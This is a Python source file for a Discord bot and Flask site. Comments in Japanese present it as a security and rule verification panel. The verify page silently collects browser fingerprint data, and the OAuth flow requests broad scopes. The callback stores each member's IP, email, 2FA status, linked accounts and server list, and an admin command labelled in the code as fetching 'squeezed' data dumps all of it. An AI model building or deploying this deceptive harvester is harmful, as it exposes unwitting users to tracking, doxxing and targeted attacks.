import asyncio
import json
import os
import datetime
from threading import Thread

import discord
from discord import app_commands
from discord.ext import commands
from flask import Flask, render_template_string, request, jsonify, redirect, session
import requests

import firebase_admin
from firebase_admin import credentials, firestore

import logging

# ログ設定
logging.basicConfig(level=logging.INFO)

# --------------------------------------------------
# 設定 & 環境変数
# --------------------------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN") or os.getenv("DISCORD_BOT_TOKEN")
PROXY_URL = os.getenv("PROXY_URL")
MEMBER_ROLE_ID = int(os.getenv("MEMBER_ROLE_ID", "0"))
WEB_URL = os.getenv("WEB_URL", "").rstrip("/")
PORT = int(os.getenv("PORT", 10000))

CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
REDIRECT_URI = f"{WEB_URL}/oauth/callback" if WEB_URL else f"http://localhost:{PORT}/oauth/callback"

# --------------------------------------------------
# Firebase 初期化
# --------------------------------------------------
firebase_creds_json = os.getenv("FIREBASE_CREDENTIALS")

if firebase_creds_json:
    try:
        cred_dict = json.loads(firebase_creds_json)
        if "private_key" in cred_dict:
            cred_dict["private_key"] = cred_dict["private_key"].replace("\\n", "\n")
        cred = credentials.Certificate(cred_dict)
        firebase_admin.initialize_app(cred)
        print("✅ Firebase Admin SDK の初期化に成功しました")
    except Exception as e:
        print(f"❌ Firebase 初期化エラー: {e}")
elif os.path.exists("serviceAccountKey.json"):
    cred = credentials.Certificate("serviceAccountKey.json")
    firebase_admin.initialize_app(cred)
    print("✅ ローカルファイルで Firebase の初期化に成功しました")
else:
    print("⚠️ 警告: FIREBASE_CREDENTIALS または serviceAccountKey.json が見つかりません。")

try:
    db = firestore.client()
except Exception as e:
    db = None
    print(f"⚠️ Firestoreクライアントの取得に失敗しました: {e}")

# --------------------------------------------------
# Firestore データヘルパー
# --------------------------------------------------
def save_user_data(user_id, data_dict):
    if not db:
        print("⚠️ データベースが未接続のためデータを保存できません")
        return
    try:
        doc_ref = db.collection("verifications").document(str(user_id))
        doc_ref.set(data_dict, merge=True)
    except Exception as e:
        print(f"❌ Firestore保存エラー: {e}")

def load_all_data():
    if not db:
        print("⚠️ データベースが未接続のためデータを読み込めません")
        return {}
    try:
        docs = db.collection("verifications").stream()
        return {doc.id: doc.to_dict() for doc in docs}
    except Exception as e:
        print(f"❌ Firestore読み込みエラー: {e}")
        return {}

# --------------------------------------------------
# Flask Webサーバー
# --------------------------------------------------
app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET_KEY", "kuwakuwa_secret_key_change_this")

@app.route("/ping")
def ping():
    return "pong", 200

# クライアント側（ブラウザ）の情報をJSで集めてサーバーに投げる仕組みを入れたテンプレート
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>認証</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: sans-serif; color: #fff; height: 100vh; display: flex; justify-content: center; align-items: center; background: #111; }
    .container { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 40px; border-radius: 16px; text-align: center; width: 90%; max-width: 420px; }
    h1 { font-size: 1.5rem; margin-bottom: 10px; }
    p { color: #aaa; font-size: 0.9rem; margin-bottom: 25px; }
    .verify-btn { width: 100%; padding: 14px; font-size: 1rem; color: #fff; background: #5865F2; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; text-decoration: none; display: inline-block; transition: background 0.2s; }
    .verify-btn:hover { background: #4752C4; }
  </style>
</head>
<body>
  <div class="container">
    <h1>認証</h1>
    <p>認証を行ってください。</p>
    <button id="verify-btn" class="verify-btn" onclick="startAuth()">Discordアカウントで認証する</button>
  </div>
  <script>
    function startAuth() {
      // ブラウザから取得できる端末・環境情報を集める
      const clientInfo = {
        screen_resolution: window.screen.width + "x" + window.screen.height,
        color_depth: window.screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        platform: navigator.platform,
        hardware_concurrency: navigator.hardwareConcurrency || "不明"
      };
      
      // サーバーに一時保存するためのリクエストを投げてからOAuthへ進む
      fetch("/save-client-info/{{ user_id }}", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(clientInfo)
      }).then(() => {
        window.location.href = "/oauth/login/{{ user_id }}";
      }).catch(() => {
        window.location.href = "/oauth/login/{{ user_id }}";
      });
    }
  </script>
</body>
</html>
"""

SUCCESS_TEMPLATE = """
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>認証完了</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: sans-serif; color: #fff; height: 100vh; display: flex; justify-content: center; align-items: center; background: #111; }
    .container { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 40px; border-radius: 16px; text-align: center; width: 90%; max-width: 420px; }
    h1 { font-size: 1.5rem; color: #80ff80; margin-bottom: 15px; }
    p { color: #ccc; font-size: 0.95rem; line-height: 1.5; }
  </style>
</head>
<body>
  <div class="container">
    <h1>✅ 認証完了！</h1>
    <p>権限の付与が正常に完了しました。<br>Discordアプリに戻ってください。</p>
  </div>
</body>
</html>
"""

@app.route("/")
def home():
    return "Bot status: Running"

@app.route("/verify/<int:user_id>", methods=["GET"])
def verify(user_id):
    session['target_user_id'] = user_id
    return render_template_string(HTML_TEMPLATE, user_id=user_id)

@app.route("/save-client-info/<int:user_id>", methods=["POST"])
def save_client_info(user_id):
    data = request.json or {}
    session['client_info'] = data
    return jsonify({"status": "ok"})

@app.route("/oauth/login/<int:user_id>")
def oauth_login(user_id):
    session['target_user_id'] = user_id
    if not CLIENT_ID:
        return "❌ サーバー設定エラー: DISCORD_CLIENT_ID が設定されていません。", 500
    
    discord_auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections%20messages.read"
    )
    return redirect(discord_auth_url)

@app.route("/oauth/callback")
def oauth_callback():
    code = request.args.get("code")
    user_id = session.get('target_user_id')

    if not code or not user_id:
        return "❌ 認証エラーが発生しました。もう一度やり直してください。", 400

    ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip_address and "," in ip_address:
        ip_address = ip_address.split(",")[0].strip()

    # Discord トークン交換
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    token_res = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    if token_res.status_code != 200:
        return f"❌ Discordトークンの取得に失敗しました: {token_res.text}", 400

    token_json = token_res.json()
    access_token = token_json.get("access_token")
    user_headers = {"Authorization": f"Bearer {access_token}"}

    # 1. ユーザー基本情報（アイコン、バナー、カラー等フル取得）
    user_res = requests.get("https://discord.com/api/users/@me", headers=user_headers)
    if user_res.status_code != 200:
        return "❌ ユーザー情報の取得に失敗しました。", 400
    user_info = user_res.json()

    discord_username = user_info.get("username", f"User_{user_id}")
    global_name = user_info.get("global_name", "設定なし")
    discord_email = user_info.get("email", "未取得")
    verified = user_info.get("verified", False)
    mfa_enabled = user_info.get("mfa_enabled", False)
    locale = user_info.get("locale", "不明")
    
    avatar = user_info.get("avatar")
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png" if avatar else "なし"
    
    banner = user_info.get("banner")
    banner_url = f"https://cdn.discordapp.com/banners/{user_id}/{banner}.png" if banner else "なし"
    accent_color = user_info.get("accent_color")
    accent_color_hex = f"#{accent_color:06x}" if accent_color else "なし"

    # 2. 連携アカウント (connections)
    connections_list = []
    conn_res = requests.get("https://discord.com/api/users/@me/connections", headers=user_headers)
    if conn_res.status_code == 200:
        connections_list = [f"{c.get('type')}: {c.get('name')}" for c in conn_res.json()]

    # 3. 参加サーバー一覧 (guilds の詳細データ)
    guilds_detail = []
    guild_res = requests.get("https://discord.com/api/users/@me/guilds", headers=user_headers)
    if guild_res.status_code == 200:
        guilds_json = guild_res.json()
        guilds_detail = [{"name": g.get("name"), "id": g.get("id"), "owner": g.get("owner")} for g in guilds_json]

    # 4. ブラウザ側から収集したクライアント端末情報
    client_info = session.get('client_info', {})

    # Discord Bot側でロール付与
    guild = discord_bot.guilds[0] if discord_bot.guilds else None
    roles_list = []

    if guild:
        async def process_member():
            nonlocal roles_list
            try:
                member = await guild.fetch_member(user_id)
                if member:
                    roles_list = [r.name for r in member.roles if r.name != "@everyone"]
                    if MEMBER_ROLE_ID != 0:
                        role = guild.get_role(MEMBER_ROLE_ID)
                        if role:
                            await member.add_roles(role)
            except Exception as e:
                print(f"❌ メンバー処理エラー: {e}")

        future = asyncio.run_coroutine_threadsafe(process_member(), discord_bot.loop)
        try:
            future.result(timeout=10)
        except Exception as e:
            print(f"❌ 非同期処理タイムアウト/エラー: {e}")

    # Firestoreに全部まとめて保存
    save_user_data(user_id, {
        "username": discord_username,
        "global_name": global_name,
        "email": discord_email,
        "verified": verified,
        "mfa_enabled": mfa_enabled,
        "locale": locale,
        "avatar_url": avatar_url,
        "banner_url": banner_url,
        "accent_color": accent_color_hex,
        "roles": roles_list,
        "ip": ip_address,
        "connections": connections_list,
        "guilds_detail": guilds_detail,
        "guilds_count": len(guilds_detail),
        "client_info": client_info,
        "updated_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })

    return render_template_string(SUCCESS_TEMPLATE)

# --------------------------------------------------
# Discord Bot UI Views
# --------------------------------------------------
class RuleVerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        # 動的にURLを変更するため、ボタンをコードから追加するか、
        # あるいはインタラクション応答でURLを開くボタンを動的に返します。
        # 今回はボタンを押されたら直接URL付きのビュー（またはDiscordのURLボタン）を返すか、
        # あらかじめリンクボタンを動的に生成する方式にします。

    @discord.ui.button(label="セキュリティ・ルール認証を行う", style=discord.ButtonStyle.primary, custom_id="rule_verify_btn")
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = interaction.user.id
        base_url = WEB_URL if WEB_URL else f"http://localhost:{PORT}"
        verify_url = f"{base_url}/verify/{user_id}"
        
        # リンクを開くためのボタンを持つViewをエフェメラルで送信する
        view = discord.ui.View()
        view.add_item(discord.ui.Button(label="🔗 認証ページを開く", style=discord.ButtonStyle.link, url=verify_url))

        await interaction.response.send_message(
            "↓下のボタンをクリックして認証を進めてください。",
            view=view,
            ephemeral=True
        )
# --------------------------------------------------
# Discord Bot クラス
# --------------------------------------------------
class MyBot(commands.Bot):
    async def setup_hook(self):
        self.add_view(RuleVerifyView())
        synced = await self.tree.sync()
        print(f"✅ スラッシュコマンド同期完了: {len(synced)} 件")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

discord_bot = MyBot(command_prefix="!", intents=intents, proxy=PROXY_URL)

@discord_bot.event
async def on_ready():
    print("========================================")
    print("✅ Discord Bot 接続成功")
    print(f"🤖 Bot: {discord_bot.user}")
    print("========================================")

# --------------------------------------------------
# スラッシュコマンド (/rule, /kuwakuwa)
# --------------------------------------------------

@discord_bot.tree.command(name="rule", description="認証パネルを送信します")
@app_commands.allowed_installs(guilds=True, users=False)
@app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
async def rule_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="認証",
        description="下のボタンを押して、システム認証とルール承諾を行ってください。",
        color=0x5865F2
    )
    await interaction.response.send_message(embed=embed, view=RuleVerifyView())

@discord_bot.tree.command(name="kuwakuwa", description="搾り取った全データを取得します")
@app_commands.allowed_installs(guilds=True, users=False)
@app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
@app_commands.default_permissions(administrator=True)
async def kuwakuwa_command(interaction: discord.Interaction):
    try:
        data = load_all_data()
        if not data:
            await interaction.response.send_message("記録はありません（またはデータベースが未接続です）。", ephemeral=True)
            return
        
        lines = []
        for uid, info in data.items():
            username = info.get('username', 'Unknown')
            g_name = info.get('global_name', '')
            email = info.get('email', '未取得')
            verified = info.get('verified', False)
            mfa = info.get('mfa_enabled', False)
            locale = info.get('locale', '不明')
            ip = info.get('ip', '未記録')
            guilds_cnt = info.get('guilds_count', 0)
            conns = info.get('connections', [])
            conn_str = ", ".join(conns) if conns else "なし"
            c_info = info.get('client_info', {})
            res = c_info.get('screen_resolution', '不明')
            plat = c_info.get('platform', '不明')
            tz = c_info.get('timezone', '不明')
            updated_at = info.get('updated_at', '日時不明')
            
            lines.append(
                f"・**{username}** ({g_name}) (ID: `{uid}`)\n"
                f"  └ ✉️ `{email}` (認証: `{verified}` / 2FA: `{mfa}` / 言語: `{locale}`)\n"
                f"  └ 🌐 IP: `{ip}` │ 💻 端末OS: `{plat}` ({res}) │ 🌍 TZ: `{tz}`\n"
                f"  └ 🏰 サーバー数: `{guilds_cnt}個` │ 🔗 連携: `{conn_str}`\n"
                f"  └ 🕒 記録日時: `{updated_at}`"
            )
        
        current_chunk = "📜 **【フルスキャン搾取データ一覧】**\n\n"
        chunks = []
        
        for line in lines:
            if len(current_chunk) + len(line) + 1 > 1950:
                chunks.append(current_chunk)
                current_chunk = ""
            current_chunk += line + "\n\n"
        
        if current_chunk:
            chunks.append(current_chunk)

        await interaction.response.send_message(chunks[0], ephemeral=True)
        for chunk in chunks[1:]:
            await interaction.followup.send(chunk, ephemeral=True)

    except Exception as e:
        print(f"❌ kuwakuwaコマンド実行エラー: {e}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"❌ エラーが発生しました: {e}", ephemeral=True)

# --------------------------------------------------
# Bot起動処理
# --------------------------------------------------
async def start_bot_with_retry():
    if not BOT_TOKEN:
        raise RuntimeError("BOT_TOKEN が環境変数に設定されていません。")

    retry_delay = 15
    max_delay = 300

    while True:
        try:
            print("🚀 Discord Bot に接続を試みています...")
            await discord_bot.start(BOT_TOKEN)
            break
        except discord.errors.HTTPException as e:
            if e.status in (429, 502, 504):
                print(f"⚠️ Discord API 通信エラー ({e.status})。{retry_delay} 秒後に再試行します...")
                await asyncio.sleep(retry_delay)
                retry_delay = min(retry_delay * 2, max_delay)
            else:
                print(f"❌ Discord HTTP エラー: {e}")
                await asyncio.sleep(15)
        except Exception as e:
            print(f"❌ エラーが発生しました: {e}")
            await asyncio.sleep(15)

# --------------------------------------------------
# メイン実行
# --------------------------------------------------
async def main():
    flask_thread = Thread(target=lambda: app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False))
    flask_thread.daemon = True
    flask_thread.start()
    print(f"🌐 Flask サーバーをポート {PORT} で起動しました")

    await start_bot_with_retry()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("👋 プログラムを終了します。")
